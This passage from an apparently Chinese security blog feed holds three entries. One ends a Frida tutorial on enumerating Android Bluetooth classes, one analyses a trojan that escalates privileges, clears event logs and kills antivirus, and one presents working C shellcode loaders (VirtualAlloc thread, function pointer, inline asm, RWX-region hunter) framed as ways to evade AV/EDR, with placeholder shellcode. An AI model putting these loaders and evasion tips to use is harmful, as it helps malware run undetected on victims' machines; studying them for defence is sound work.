alt="image.png"></p><p>这里不再赘述代码的其他部分，只说onMatch函数的判断</p><p><code>instance</code>是通过<code>Java.enumerateLoadedClasses</code>获取到的类，代表一个完整类名</p><p><code>split(&quot;.&quot;)[1]</code>是JavaScript的字符串方法，用于按照分隔符将字符串进行分割，因为类名多是以<code>&quot;.&quot;</code>进行命名，所以将<code>&quot;.&quot;</code>作为分割符使用，<code>[1]</code>则是JavaScript 数组索引操作符，用于获取数组中指定索引位置的元素。在这里，我们获取分割后的字符串数组的第二个元素，即索引为1的元素。</p><h3 id="打印类的实例"><a href="#打印类的实例" class="headerlink" title="打印类的实例"></a>打印类的实例</h3><p>在我们定位到目标类后，就可以打印想要研究的类的实例了</p><p>代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.bluetooth.BluetoothDevice&quot;</span>,&#123;</span><br><span class="line">  <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] &quot;</span>+<span class="string">&quot; android.bluetooth.BluetoothDevice instance found&quot;</span>+<span class="string">&quot; :=&gt; &#x27;&quot;</span>+instance+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="title function_">bluetoothDeviceInfo</span>(instance);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] -----&quot;</span>);&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l hello.js com.android.bluetooth</span><br></pre></td></tr></table></figure><h3 id="枚举所有方法"><a href="#枚举所有方法" class="headerlink" title="枚举所有方法"></a>枚举所有方法</h3><p>使用<code>java.use()</code>获取所有方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 获取 android.bluetooth.IBluetoothHeadset 接口的类对象</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BluetoothHeadset</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.bluetooth.IBluetoothHeadset&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该接口的所有方法</span></span><br><span class="line">        <span class="keyword">var</span> methods = <span class="title class_">BluetoothHeadset</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历所有方法</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> method = methods[i];</span><br><span class="line">            <span class="comment">// 输出方法名</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(method.<span class="title function_">toString</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 立即执行枚举方法</span></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>控制台命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l hello.js com.android.bluetooth</span><br></pre></td></tr></table></figure><p><img src="https://p.sda1.dev/17/f3a8f676eb41e6fbf9aafb5211721bcb/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/f3a8f676eb41e6fbf9aafb5211721bcb/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>获取了方法，接下来就是对方法的各种修改拦截了。</p>]]></content>
      
      
      <categories>
          
          <category> Hook框架 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>恶意程序分析流程</title>
      <link href="/2024/04/10/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/04/10/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>这段时间想着来分析几个木马程序练练手，这篇博客就来记录一下整个恶意代码的分析过程，有个大致了解，同时也想看看木马如何获取到目标主机的权限，对攻击手法有一个大致的了解。</p><span id="more"></span><h2 id="对程序本身特征进行检查"><a href="#对程序本身特征进行检查" class="headerlink" title="对程序本身特征进行检查"></a>对程序本身特征进行检查</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p><img src="D:/typora/picture/image-20240506214246066.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506214246066.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506214246066"></p><p>程序为32位程序，没有加壳</p><h3 id="查看PE文件节表信息"><a href="#查看PE文件节表信息" class="headerlink" title="查看PE文件节表信息"></a>查看PE文件节表信息</h3><p><img src="D:/typora/picture/image-20240506214354787.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506214354787.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506214354787"></p><p>可以看到节表中有一个叫”baidu”的段，正常程序中不会有这个段</p><h3 id="查看文件存在的字符串"><a href="#查看文件存在的字符串" class="headerlink" title="查看文件存在的字符串"></a>查看文件存在的字符串</h3><p><img src="D:/typora/picture/image-20240506214649261.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506214649261.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506214649261"></p><p>存在一个网址，猜测可能有网络操作</p><h2 id="查看恶意程序进行分析"><a href="#查看恶意程序进行分析" class="headerlink" title="查看恶意程序进行分析"></a>查看恶意程序进行分析</h2><p>源程序shoves.exe的函数</p><p><img src="D:/typora/picture/image-20240506214948886.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506214948886.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506214948886"></p><p>静态分析没有得到结果，尝试在OD中动态分析</p><p>在0x41021A地址处存在一个解密函数，将0x4106bc处的内容动态解密</p><p>解密前：</p><p><img src="D:/typora/picture/image-20240506215730129.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506215730129.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506215730129"></p><p>解密后：</p><p><img src="D:/typora/picture/image-20240506215829348.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506215829348.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506215829348"></p><p>可以看到Dos头已经出现了，说明这是另外的一个PE文件，dump出来后发现是一个dll文件</p><p>接着分析Dll文件</p><h3 id="为进程提权"><a href="#为进程提权" class="headerlink" title="为进程提权"></a>为进程提权</h3><p>通过OpenProcessToken得到进程的令牌句柄，使用LookupPrivilegeValue查询进程权限，最后用AdjustTokenPrivileges函数提升权限</p><p><img src="D:/typora/picture/image-20240506221014065.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506221014065.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506221014065"></p><h3 id="删除日志"><a href="#删除日志" class="headerlink" title="删除日志"></a>删除日志</h3><p>通过OpenEventLog函数打开日志文件，如果成功打开，调用ClearEventLog函数清除日志文件，最后调用CloseEventLog函数关闭日志文件</p><p><img src="D:/typora/picture/image-20240506221200698.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506221200698.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506221200698"></p><h3 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h3><p>查询系统镜像，获得所有进程信息，并查找杀软</p><p><img src="D:/typora/picture/image-20240506222635919.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506222635919.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506222635919"></p><p>杀软字典</p><p><img src="D:/typora/picture/image-20240506221715572.png" class="lazyload" data-srcset="D:/typora/picture/image-20240506221715572.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240506221715572"></p>]]></content>
      
      
      <categories>
          
          <category> bypass </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shellcode的加载</title>
      <link href="/2023/11/12/shellcode%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F/"/>
      <url>/2023/11/12/shellcode%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>今天来学习一下<code>shellcode</code>的各种加载方式、</p><span id="more"></span><h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在进程的内存空间中，你有没有想过执行一段shellcode需要什么？为了执行你的shellcode，需要完成三个检查：</p><ul><li>1.内存是否被标记为可执行的虚拟地址空间，否则<a href="https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention">DEP</a>将抛出内存访问冲突异常；</li><li>2.是否将shellcode放入了该内存空间；</li><li>3.是否将代码的执行流定位到该内存空间。</li></ul><p>完成这三步可以使用API来理解，首先<code>VirtualAlloc</code>分配出一片可读、可写可执行的内存，将<code>shellcode</code>使用<code>RtlMoveMemory</code>之类的函数复制到该内存空间，最后创建一个指向新分配内存区域的线程来执行<code>shellcode</code>。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\xcc\xcc\xcc\xcc\x41\x41\x41\x41&quot;</span>;</span><br><span class="line"><span class="comment">// 分配内存</span></span><br><span class="line">LPVOID addressPointer = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="comment">// 复制shellcode</span></span><br><span class="line">RtlMoveMemory(addressPointer, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="comment">// 新建线程指向新分配的内存空间</span></span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addressPointer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 休眠一秒钟等待线程</span></span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得注意的是，虽然这段代码将 <code>shellcode</code> 拷贝到了堆内存中，但这只是为了将其执行（因为已经赋予这片内存空间RWX权限了）。默认情况下受到Windows XP中引入的系统范围数据执行保护（DEP）策略的保护。对于启用DEP的进程，这将防止在此内存区域执行代码。为了克服这个障碍，我们要求系统将所需的内存区域标记为RWX。这是通过将<code>VirtualAlloc</code>的最后一个参数指定为0x40来实现的，就相当<code>PAGE_EXECUTE_READWRITE</code>。</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>WinAPI调用的使用很容易被成熟的AV&#x2F;EDR系统检测到。</p><h2 id="通过函数指针分配"><a href="#通过函数指针分配" class="headerlink" title="通过函数指针分配"></a>通过函数指针分配</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>函数指针是指向函数的指针变量。在C语言中，函数名实际上就是该函数在内存中的地址，因此可以将函数名赋值给指针变量，从而使得该指针变量指向该函数。</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;\xcc\xcc\xcc\xcc&quot;</span>;</span><br><span class="line"><span class="comment">//定义函数指针func</span></span><br><span class="line"><span class="type">int</span> (*func)();</span><br><span class="line"><span class="comment">//将buf的地址类型强转为函数指针，赋值给func</span></span><br><span class="line">func = (<span class="type">int</span> (*)()) (<span class="type">void</span>*)buf;</span><br><span class="line">(<span class="type">int</span>)(*func)();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 另一个函数指针运行方式</span></span><br><span class="line"><span class="comment">// (*(int(*)()) buf)();</span></span><br><span class="line"><span class="comment">// sleep for a second</span></span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就实现了将shellcode的地址作为函数去执行。但shellcode此时在内存作为调试指令，并没有尝试执行任何非法内存区域的代码，所以也不会触发DEP。如果shellcode中包含了真正的恶意代码，可能会尝试执行或修改内存中的敏感区域，这时应该就会触发DEP。我们可以通过设置&#x2F;NXCOMPAT：NO标志来简单地为已编译的可执行文件禁用DEP（对于VisualStudio，可以在高级链接器选项中设置）。这样，shellcode就会被顺利的执行。</p><p>通过这种加载方式，可以用来避免AV&#x2F;DER的检测，并且这种方式加载，shellcode会在栈上作为局部变量分配，栈是可读可写的，就允许我们在这个内存区域中对shellcode进行加密。</p><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><p>DEP会阻止栈中代码的执行，需要在没有DEP支持的情况下编译代码。</p><h2 id="Text段加载"><a href="#Text段加载" class="headerlink" title=".Text段加载"></a>.Text段加载</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>代码段存在可执行权限，所以无需担心DEP抛出异常，问题在于如何将shellcode放置和执行在代码段。首先API函数不可用，因为代码段是没有写权限的；函数指针也用不上，将位于数据段的shellcode转为函数指针来执行也依然在数据段中。那么还有内联汇编这个办法可以使用。</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;.byte 0xde,0xad,0xbe,0xef,0x00\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;ret\n\t&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此代码是<a href="https://github.com/Mr-Un1k0d3r/Shellcoding">项目</a>中的一个demo，使用Gcc编译环境就可以编译运行了。</p><p>因为没有API调用，所以可以用来避免AV&#x2F;EDR的检测。</p><h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><p>缺点很明显，因为没有可写权限，所以没有加密过的shellcode很容易就会被检测出来。为了避免被检测可以在内联汇编中进行代码的加密和解密。</p><h2 id="RWX-Hunter"><a href="#RWX-Hunter" class="headerlink" title="RWX-Hunter"></a>RWX-Hunter</h2><h3 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h3><p>意思很明显，就是去寻找内存中被标记为R-W-X的区域，既避免了使用高危API开辟空间，也无需担心会触发DEP警告。但这里还有很多问题需要考虑。</p><ul><li>如何查找可执行的内存区域；</li><li>如何将shellcode放入此内存；</li><li>如何将代码执行流运行到此处。</li></ul><p>进程4G的虚拟内存，范围从0x00000000到0x7fffffff，搜索范围就可以确定下来，用<code>VirtualQueryEx</code>查询从0开始的内存信息，接下来判断是否为可读可写可执行的区域，如果找到就可以写入shellcode，我们可以用API来解决写入这个问题，或者使用函数指针也可以。最后执行也可以考虑API函数或者函数指针来调用shellcode执行。</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LPVOID <span class="title function_">Hunt</span><span class="params">(DWORD processID)</span></span><br><span class="line">&#123;</span><br><span class="line">HMODULE hMod;</span><br><span class="line">DWORD cbNeeded;</span><br><span class="line">TCHAR szProcessName[MAX_PATH] = TEXT(<span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//获取目标进程句柄</span></span><br><span class="line">HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);</span><br><span class="line"><span class="keyword">if</span> (EnumProcessModules(process, &amp;hMod, <span class="keyword">sizeof</span>(hMod),</span><br><span class="line">&amp;cbNeeded))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//枚举指定进程的模块，并获取每个模块的基本信息</span></span><br><span class="line">GetModuleBaseName(process, hMod, szProcessName,</span><br><span class="line"><span class="keyword">sizeof</span>(szProcessName) / <span class="keyword">sizeof</span>(TCHAR));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (process) &#123;</span><br><span class="line">_tprintf(TEXT(<span class="string">&quot;[*] Searching in %s  (PID: %u)...&quot;</span>), szProcessName, processID);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> MaxAddress = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="type">long</span> address = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">            <span class="comment">//MEMORY_BASIC_INFORMATION 结构体m </span></span><br><span class="line">MEMORY_BASIC_INFORMATION m;</span><br><span class="line"><span class="comment">//VirtualQueryEx 函数来查询指定进程中从 address 开始的内存信息，并将结果存储在结构体m</span></span><br><span class="line"><span class="type">int</span> result = VirtualQueryEx(process, (LPVOID)address, &amp;m, <span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION));</span><br><span class="line">            <span class="comment">//判断m.AllocationProtect 是否等于PAGE_EXECUTE_READWRITE</span></span><br><span class="line"><span class="keyword">if</span> (m.AllocationProtect == PAGE_EXECUTE_READWRITE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RWX found at 0x%x\n&quot;</span>, m.BaseAddress);</span><br><span class="line"><span class="keyword">return</span> m.BaseAddress;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>( c &gt; <span class="number">50000</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Still Hunting&quot;</span>);</span><br><span class="line">c = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">            <span class="comment">//如果找到该空间，则返回该空间</span></span><br><span class="line"><span class="keyword">if</span> (address == (<span class="type">long</span>)m.BaseAddress + (<span class="type">long</span>)m.RegionSize)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//否则将下一个搜索地址设置为下一个存储区域(基地址+内存区域)。</span></span><br><span class="line">address = (<span class="type">long</span>)m.BaseAddress + (<span class="type">long</span>)m.RegionSize;</span><br><span class="line">&#125; <span class="keyword">while</span> (address &lt;= MaxAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Nope\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(TEXT(<span class="string">&quot;[*] No Access for %s  (PID: %u) \n&quot;</span>), szProcessName, processID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Exec</span><span class="params">(LPVOID address, DWORD processID)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Exec Shellcode... &quot;</span>);</span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/exec CMD=&#x27;&quot;C:\Windows\System32\cmd.exe&quot;&#x27; EXITFUNC=thread --platform Windows -f c</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//打开当前进程</span></span><br><span class="line">HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);</span><br><span class="line">    <span class="comment">//写入shellcode</span></span><br><span class="line">WriteProcessMemory(procHandle, address, shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//运行shellcode</span></span><br><span class="line">hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPVOID)(address), <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Done \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Starting Search \n&quot;</span>);</span><br><span class="line">    <span class="comment">//搜索的起始地址</span></span><br><span class="line">LPVOID spaceAddress = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//当前进程PID</span></span><br><span class="line">DWORD currentProc = GetCurrentProcessId();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Current PID: %d&quot;</span>, (<span class="type">int</span>)currentProc);</span><br><span class="line">    <span class="comment">//获取RWX地址</span></span><br><span class="line">spaceAddress = Hunt(currentProc);</span><br><span class="line"><span class="keyword">if</span> (spaceAddress &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//执行shellcode</span></span><br><span class="line">Exec(spaceAddress, currentProc);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);    </span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">10000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码借鉴于<a href="https://github.com/csandker/inMemoryShellcode.git">https://github.com/csandker/inMemoryShellcode.git</a></p><h3 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h3><p>无法绕过代码执行时的高危API函数，但也许在关联检查时可以绕过一些AV&#x2F;EDR。再进阶一下，使用API隐藏技术进行API的调用，或许可以免杀绕过。</p>]]></content>
      
      
      <categories>
          
          <category> bypass </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>免杀初探</title>
      <link href="/2023/11/12/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/12/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0/</url>
      
